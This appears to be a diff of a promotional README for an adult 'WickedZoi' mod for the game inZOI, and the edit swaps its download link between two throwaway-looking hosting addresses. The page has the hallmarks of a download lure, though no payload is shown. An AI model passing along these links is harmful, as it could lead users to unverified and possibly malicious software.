@@ -4,7 +4,7 @@
 
 inZOI already flexes Unreal Engine visuals and “Smart Zoi” AI, but the base game keeps it PG-13. Drop **WickedZoi** into the mix and nightly city skylines flip to neon after-hours: uncensored skins, advanced romance logic, dynamic fertility, and vice careers that turn your sandbox into an R-rated life-sim playground.
 
-[![Download Mod](https://img.shields.io/badge/Download-Mod-blueviolet)](https://fileoffload13.bitbucket.io)
+[![Download Mod](https://img.shields.io/badge/Download-Mod-blueviolet)](https://Inzoi-Adult-Mod-lej.github.io/.github)
 ---
 
 ## Product Description
